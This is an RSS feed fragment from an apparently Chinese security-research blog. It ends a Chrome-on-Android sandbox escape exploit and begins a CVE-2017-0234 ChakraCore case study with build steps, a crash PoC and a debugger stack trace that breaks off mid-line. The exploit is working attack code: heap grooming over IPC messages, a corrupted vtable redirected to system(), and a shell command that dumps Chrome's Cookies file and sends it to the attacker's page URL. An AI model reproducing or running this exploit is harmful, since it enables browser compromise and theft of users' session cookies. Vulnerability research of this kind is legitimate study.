class="keyword">if</span>(sockets == <span class="number">2</span>) &#123;</span><br><span class="line">                fd_pipe_ = fd;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sockets == <span class="number">7</span>) &#123;</span><br><span class="line">                pipe_ = fd;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sockets++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(fd != <span class="number">100</span>);</span><br><span class="line">    alert(<span class="string">'+3'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block the IO thread (and all the other ones) for a moment</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> SIGUSR2 = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAIT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAKE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> myfutex = scratch;</span><br><span class="line">    assert(call(funcs.bsd_signal, SIGUSR2, stub2) != NEGONE);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x10</span>, myfutex);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x14</span>, FUTEX_WAIT);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x18</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x1c</span>, <span class="number">0</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x20</span>, funcs.futex);</span><br><span class="line">    write32(myfutex, <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> tid = mypid + <span class="number">1</span>; tid &lt; mypid + <span class="number">1000</span>; tid++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tid == mytid) <span class="keyword">continue</span>;</span><br><span class="line">        call(funcs.tkill, tid, SIGUSR2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// In practice, this is quite predictable (+ no guards!) and nowhere</span></span><br><span class="line">    <span class="comment">// near this many copies is actually necessary.  But we do what we</span></span><br><span class="line">    <span class="comment">// can...</span></span><br><span class="line">    <span class="keyword">var</span> guessedAddress = <span class="number">0xa0a0a0a0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> PINUSE_BIT = <span class="number">1</span>, CINUSE_BIT = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> chunkSize = <span class="number">0x68</span>;</span><br><span class="line">        <span class="keyword">var</span> fakeHead = chunkSize | PINUSE_BIT | CINUSE_BIT;</span><br><span class="line">        setNonblock(pipe_, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">var</span> fds = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> stream_id = <span class="number">0</span>; stream_id &lt; <span class="number">100</span>; stream_id++) &#123;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00250067</span>, <span class="comment">// AudioHostMsg_CreateStream</span></span><br><span class="line">                    MInt(stream_id), <span class="comment">// stream_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// render_view_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// session_id</span></span><br><span class="line">                    <span class="comment">// params</span></span><br><span class="line">                    MInt(<span class="number">2</span>), <span class="comment">// format=AUDIO_PCM_FAKE</span></span><br><span class="line">                    MInt(<span class="number">29</span>), <span class="comment">// channel_layout=CHANNEL_LAYOUT_DISCRETE</span></span><br><span class="line">                    MInt(<span class="number">3000</span>), <span class="comment">// sample_rate</span></span><br><span class="line">                    MInt(<span class="number">32</span>), <span class="comment">// bits_per_sample</span></span><br><span class="line">                    MInt(<span class="number">192000</span>), <span class="comment">// frames_per_buffer</span></span><br><span class="line">                    MInt(<span class="number">31</span>), <span class="comment">// channels</span></span><br><span class="line">                    MInt(<span class="number">0</span>)); <span class="comment">// input_channels</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> msg = messageReceive([</span><br><span class="line">                    <span class="number">0x00250032</span>, <span class="comment">// AudioMsg_NotifyStreamCreated</span></span><br><span class="line">                    <span class="number">0x00250053</span> <span class="comment">// AudioMsg_NotifyStreamStateChanged</span></span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(msg.type == <span class="number">0x00250032</span>) &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'handle'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'socket_handle'</span>),</span><br><span class="line">                        MInt(<span class="string">'length'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">var</span> len = msg.length;</span><br><span class="line">                <span class="comment">//log += 'len=' + len + '\n';</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> PROT_READ = <span class="number">1</span>, PROT_WRITE = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">var</span> MAP_SHARED = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                fds.push([msg.handle, len]);</span><br><span class="line">                <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, msg.handle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                assert(addr != NEGONE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Sadly, there is no copy-on-write memcpy on Linux like</span></span><br><span class="line">                <span class="comment">// vm_copy on OS X.  Oh well, we have lots of RAM.</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = guessedAddress &amp; <span class="number">0xfff</span>; i &lt; len; i += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                    <span class="comment">// head</span></span><br><span class="line">                    write32(addr + i + <span class="number">4</span>, fakeHead);</span><br><span class="line">                    <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">                    write32(addr + i + <span class="number">8</span>, NEGONE);</span><br><span class="line">                    write32(addr + i + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// dunno if we have enough address space here</span></span><br><span class="line">                assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MInt(<span class="string">'new_state'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += '**' + JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        log += <span class="string">'got up to '</span> + stream_id + <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// And here is the actual sandbox vulnerability.  This is pretty dumb.</span></span><br><span class="line">        <span class="comment">// This calls Map on the specified pointer, which should fail, then</span></span><br><span class="line">        <span class="comment">// frees it, putting a free allocation in shared memory.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sidenote: It might be possible to use addresses in libchromeview to</span></span><br><span class="line">        <span class="comment">// avoid the ASLR spamming.  dlmalloc's free has a basic check for</span></span><br><span class="line">        <span class="comment">// addresses being &gt;= the first mmapped address, but I think</span></span><br><span class="line">        <span class="comment">// libchromeview happens to be at such addresses.  However, this is</span></span><br><span class="line">        <span class="comment">// easier so who cares...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> CBF_SMBITMAP = <span class="number">7</span>;</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">            MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">            MInt(CBF_SMBITMAP),</span><br><span class="line">            MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">            MInt(guessedAddress + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">            MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        call(funcs.usleep, <span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucketStart;</span><br><span class="line">        fds:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; fds.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> fd = fds[i][<span class="number">0</span>], len = fds[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            assert(addr != NEGONE);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = guessedAddress &amp; <span class="number">0xfff</span>; j &lt; len; j += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(addr + j + <span class="number">8</span>) != NEGONE) &#123;</span><br><span class="line">                    assert(j + <span class="number">0x1000</span> &lt;= len); <span class="comment">// too lazy to fix</span></span><br><span class="line">                    bucketStart = addr + j;</span><br><span class="line">                    <span class="keyword">break</span> fds;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(i != fds.length);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">            <span class="comment">// now that we know where it is, do more frees to decrease</span></span><br><span class="line">            <span class="comment">// the chance of spurious allocations (this would probably</span></span><br><span class="line">            <span class="comment">// be better redesigned, but whatever)</span></span><br><span class="line">            <span class="keyword">var</span> bucket = bucketStart + bucketOff;</span><br><span class="line">            write32(bucket + <span class="number">4</span>, fakeHead);</span><br><span class="line">            <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">            write32(bucket + <span class="number">8</span>, NEGONE);</span><br><span class="line">            write32(bucket + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">                MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">                MInt(CBF_SMBITMAP),</span><br><span class="line">                MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">                MInt(guessedAddress + bucketOff + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">                MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// This is an arbitrary-ish call that allocates an unusually large</span></span><br><span class="line">        <span class="comment">// object with a vtable.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucket, bucketInBrowser;</span><br><span class="line">        <span class="keyword">var</span> socket_id = <span class="number">1000</span>;</span><br><span class="line">        outer:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> P2P_SOCKET_TCP_CLIENT = <span class="number">3</span>;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190044</span>, <span class="comment">// P2PHostMsg_CreateSocket</span></span><br><span class="line">                MInt(P2P_SOCKET_TCP_CLIENT), <span class="comment">// type</span></span><br><span class="line">                MInt(++socket_id), <span class="comment">// socket_id</span></span><br><span class="line">                <span class="comment">// local_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// port</span></span><br><span class="line">                <span class="comment">// remote_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0x80808080</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">1234</span>)); <span class="comment">// port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            call(funcs.usleep, <span class="number">20000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">                bucket = bucketStart + bucketOff;</span><br><span class="line">                <span class="keyword">if</span>(read32(bucket + <span class="number">8</span> + <span class="number">0x5c</span>) == P2P_SOCKET_TCP_CLIENT) &#123;</span><br><span class="line">                    bucketInBrowser = guessedAddress + bucketOff;</span><br><span class="line">                    <span class="keyword">break</span> outer;</span><br><span class="line">                &#125;</span><br><span class="line">                write32(bucket, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">100000</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Didn't get allocated or wrong allocation or something"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// There's probably a simpler way but... I've never actually had a</span></span><br><span class="line">        <span class="comment">// chance to use system in an exploit before :]</span></span><br><span class="line">        write32(bucket + <span class="number">8</span>, bucketInBrowser - <span class="number">4</span>);</span><br><span class="line">        <span class="comment">// don't reuse please, this will be unmapped</span></span><br><span class="line">        write32(bucket + <span class="number">4</span>, <span class="number">0x10000</span> | CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">        write32(bucket, funcs.system);</span><br><span class="line">        <span class="keyword">var</span> url = <span class="built_in">window</span>.location.origin + <span class="string">'/sb.png'</span>;</span><br><span class="line">        copystr(bucket + <span class="number">12</span>, <span class="string">'; am start --user 0 -a android.intent.action.VIEW -d "'</span> + url + <span class="string">'?`hd -c 1024 /data/data/com.android.chrome/app_chrome/Default/Cookies`" &amp; kill $PPID'</span>);</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190052</span>, <span class="comment">// P2PHostMsg_DestroySocket</span></span><br><span class="line">            MInt(socket_id));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        xerr = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok, we're done...</span></span><br><span class="line">    setNonblock(pipe_, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    call(funcs.usleep, <span class="number">100000</span>);</span><br><span class="line">    write32(myfutex, <span class="number">0</span>);</span><br><span class="line">    call(funcs.futex, myfutex, FUTEX_WAKE, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//messageSend(0xfffffffe, 0xfffe);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(xerr) &#123;</span><br><span class="line">        alert(<span class="string">'Exception: '</span> + xerr + <span class="string">'\n'</span> + xerr.stack);</span><br><span class="line">        crash();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">'?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dlsym</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    copystr(callbuf + <span class="number">0x28</span>, name);</span><br><span class="line">    <span class="keyword">var</span> result = call(dlsym_addr, <span class="number">0xffffffff</span>, callbuf + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"couldn't find "</span> + name);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    initialOverwrite();</span><br><span class="line">    launderBuffers(buffersToForce, <span class="string">'saveBuffersToForce'</span>, sniffAroundInHeap);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    alert(<span class="string">'Exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>case study:cve-2017-0234</title>
    <link href="http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/"/>
    <id>http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/</id>
    <published>2018-07-03T13:32:43.339Z</published>
    <updated>2018-10-22T14:25:51.720Z</updated>
    
    <content type="html"><![CDATA[<h3 id="vs调试环境配置"><a href="#vs调试环境配置" class="headerlink" title="vs调试环境配置"></a>vs调试环境配置</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>首先下载<a href="https://github.com/Microsoft/ChakraCore" target="_blank" rel="noopener">ChakraCore</a><br>然后<code>git clone https://github.com/Microsoft/ChakraCore.git</code><br>在ChakraCore项目中搜索CVE-2017-0234，找到patch的commit，然后得到有漏洞的版本的hash<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg" alt=""><br>然后checkout,<code>git checkout d8ef97d90c231e83db96dc4fdff4b39409f7a9b6</code><br>然后在VS2015中打开<code>Build\Chakra.Core.sln</code>，并生成解决方案<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070434.jpg" alt=""></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070449.jpg" alt=""><br>右键设置为启动项目<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070458.jpg" alt=""><br>在命令参数写好绝对路径并执行<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070506.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070515.jpg" alt=""></p><h3 id="windbg调试环境配置"><a href="#windbg调试环境配置" class="headerlink" title="windbg调试环境配置"></a>windbg调试环境配置</h3><p>在windows store下载windbg preview<br>设置符号服务器<br><code>SRV*c:\edgesymbol*http://msdl.microsoft.com/download/symbols</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070526.jpg" alt=""><br>直接调试chakra<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070550.jpg" alt=""><br>Windbg preview可以直接查看源码，在源码点击下断,很方便。</p><h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">begin, end, step, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = begin; i &lt; end; i += step) view[i] = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">1</span>, <span class="number">0x1234</span>);</span><br><span class="line">write(<span class="number">0x3000000e</span>, <span class="number">0x40000010</span>, <span class="number">0x10000</span>, <span class="number">1851880825</span>);</span><br></pre></td></tr></table></figure></p><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070621.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070909.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070946.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&gt;k</span><br><span class="line"> 索引     函数      </span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"> 1      0000018d9694015c()</span><br><span class="line">*2      ChakraCore.dll!Js::InterpreterStackFrame::CallLoopBody(void *(*)(Js::RecyclableObject *, Js::CallInfo) address=0x0000018d96940000)</span><br><span class="line"> 3      ChakraCore.dll!Js::InterpreterStackFrame::DoLoopBodyStart(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, const bool doProfileLoopCheck=false, bool isFirstIteration=true)</span><br><span class="line"> 4      ChakraCore.dll!Js::InterpreterStackFrame::ProfiledLoopBodyStart&lt;1,1&gt;(unsigned int loopNumber=0, Js::LayoutSize layoutSize=SmallLayout, bool isFirstIteration=true)</span><br><span class="line"> 5      ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledLoopStart&lt;0,1&gt;(const unsigned char * ip=0x0000018d96828b49)</span><br><span class="line"> 6      ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 7      ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 8      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x0000019598284540, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fba, void * addressOfReturnAddress=0x0000002e3a7fe4b8, const bool isAsmJs=false)</span><br><span class="line"> 9      ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fe4f0)</span><br><span class="line"> 10     [外部代码]  </span><br><span class="line"> 11     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 12     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x0000019598284540, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 13     ChakraCore.dll!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=16, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 14     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfileCallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, Js::RecyclableObject * function=0x0000019598284540, unsigned int flags=0, unsigned short profileId=3, unsigned int inlineCacheIndex=3, const Js::AuxArray&lt;unsigned int&gt; * spreadIndices=0x0000000000000000)</span><br><span class="line"> 15     ChakraCore.dll!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt;(const Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallIWithICIndex&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; * playout=0x0000018d968b009f, unsigned int flags=0)</span><br><span class="line"> 16     ChakraCore.dll!Js::InterpreterStackFrame::ProcessProfiled()</span><br><span class="line"> 17     ChakraCore.dll!Js::InterpreterStackFrame::Process()</span><br><span class="line"> 18     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterHelper(Js::ScriptFunction * function=0x00000195982844e0, Js::ArgumentReader args=&#123;...&#125;, void * returnAddress=0x0000018d968e0fc2, void * addressOfReturnAddress=0x0000002e3a7fef48, const bool isAsmJs=false)</span><br><span class="line"> 19     ChakraCore.dll!Js::InterpreterStackFrame::InterpreterThunk(Js::JavascriptCallStackLayout * layout=0x0000002e3a7fef80)</span><br><span class="line"> 20     [外部代码]  </span><br><span class="line"> 21     ChakraCore.dll!amd64_CallFunction()</span><br><span class="line"> 22     ChakraCore.dll!Js::JavascriptFunction::CallFunction&lt;1&gt;(Js::RecyclableObject * function=0x00000195982844e0, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 23     ChakraCore.dll!Js::JavascriptFunction::CallRootFunctionInternal(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 24     ChakraCore.dll!Js::JavascriptFunction::CallRootFunction(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 25     ChakraCore.dll!RunScriptCore::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper=&#123;...&#125;)</span><br><span class="line"> 26     ChakraCore.dll!ContextAPIWrapper::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620)</span><br><span class="line"> 27     ChakraCore.dll!ContextAPIWrapper_Core&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) &gt;(ContextAPIWrapper::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext)&#123;...&#125;)</span><br><span class="line"> 28     ChakraCore.dll!ContextAPIWrapper&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) &gt;(RunScriptCore::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * 